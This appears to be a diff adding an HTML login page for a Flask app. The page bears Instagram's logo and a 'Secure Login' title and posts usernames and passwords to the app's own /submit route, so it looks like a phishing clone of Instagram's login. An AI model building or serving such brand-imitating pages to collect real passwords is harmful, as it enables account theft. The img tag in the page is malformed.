@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Secure Login</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+    <div class="login-container">
+        <img src=""{{ url_for('static', filename='images/instalogo.png') }} alt="instagram picture">
+        <h2>Login</h2>
+        <form action="/submit" method="POST">
+            <input type="text" name="username" placeholder="Username or Email" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Login</button>
+        </form>
+        <p class="note">Don't have an account? <a href="#">Sign up</a></p>
+    </div>
+</body>
+</html>
+
